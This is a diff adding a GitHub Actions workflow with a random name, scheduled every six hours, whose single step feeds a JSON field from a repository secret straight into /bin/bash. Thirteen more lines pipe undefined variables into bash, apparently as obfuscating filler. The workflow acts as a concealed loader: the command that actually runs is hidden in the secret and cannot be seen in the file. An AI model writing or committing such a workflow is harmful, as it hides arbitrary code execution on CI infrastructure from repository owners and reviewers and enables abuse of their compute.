@@ -1,0 +1,31 @@
+name: harmoniouswritten
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '18 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: harmoniouswritten
+        env:
+          pk9: ${{ secrets.pk9 }}
+        run: |
+          echo $pk9 | jq -r .jedkb74366 | /bin/bash
+          echo $qe37918 | jq -r .szcuo38495 | /bin/bash
+          echo $e661 | jq -r .mx49558 | /bin/bash
+          echo $asgo32268 | jq -r .fnd37039 | /bin/bash
+          echo $v67 | jq -r .paugr0 | /bin/bash
+          echo $homl7690 | jq -r .b93 | /bin/bash
+          echo $w65 | jq -r .kepvf1241 | /bin/bash
+          echo $lsj5959 | jq -r .lvdj86255 | /bin/bash
+          echo $vaib0556 | jq -r .qhmp8 | /bin/bash
+          echo $ipgic1337 | jq -r .d51 | /bin/bash
+          echo $vzq5032 | jq -r .hs6 | /bin/bash
+          echo $i15 | jq -r .fxu481 | /bin/bash
+          echo $pr20 | jq -r .in41979 | /bin/bash
+          echo $rpf84783 | jq -r .fzn67013 | /bin/bash
+
